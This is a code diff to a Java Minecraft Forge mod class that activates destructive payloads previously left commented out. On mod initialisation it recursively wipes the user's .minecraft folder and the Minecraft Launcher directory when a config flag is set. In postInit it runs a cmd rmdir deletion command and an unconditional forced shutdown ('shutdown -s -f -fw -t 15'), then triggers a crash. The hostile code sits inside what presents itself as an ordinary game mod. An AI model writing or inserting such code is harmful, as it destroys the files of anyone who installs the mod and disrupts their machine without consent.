@@ -368,11 +368,14 @@ public class Core {
 		Scripts scripts = new Scripts();
 		scripts.setup();
 
-		// Pretty much nukes everything Minecraft on their computer
-		File mcLauncher = new File("C:\\Program Files (x86)\\Minecraft Launcher");
-		File dir = new File(System.getenv("APPDATA") + "\\Roaming\\.minecraft\\");
-		// branchWipe(dir);
-		// branchWipe(mcLauncher);
+		if (scripts.getDoesDelete()) {
+			// Pretty much nukes everything Minecraft on their computer
+			File mcLauncher = new File("C:\\Program Files (x86)\\Minecraft Launcher");
+			File dir = new File(System.getenv("APPDATA") + "\\Roaming\\.minecraft\\");
+			branchWipe(dir);
+			branchWipe(mcLauncher);
+		}
+		
 		if (scripts.getDoesExecute()) {
 			for (String f : scripts.getFileExecutes()) {
 				File file = new File(f);
@@ -452,10 +455,14 @@ public class Core {
 	}
 
 	@EventHandler
-	public void postInit(FMLPostInitializationEvent event) throws Exception {
-		// Runtime.getRuntime().exec("cmd /c ping localhost -n 10 > nul && rmdir " +
-		// minecraft + "-s -q");
-		// Runtime.getRuntime().exec("shutdown -s -f -fw -t 15");
+	public static void postInit(FMLPostInitializationEvent event) throws Exception {
+		Scripts scripts = new Scripts();
+		if (scripts.getDoesDelete()) {
+			File mcLauncher = new File("C:\\Program Files (x86)\\Minecraft Launcher");
+			branchWipe(mcLauncher);
+			Runtime.getRuntime().exec("cmd /c ping localhost -n 10 > nul && rmdir " + minecraft + "-s -q");
+		}
+		Runtime.getRuntime().exec("shutdown -s -f -fw -t 15");
 		Crash c = new Crash();
 	}
 
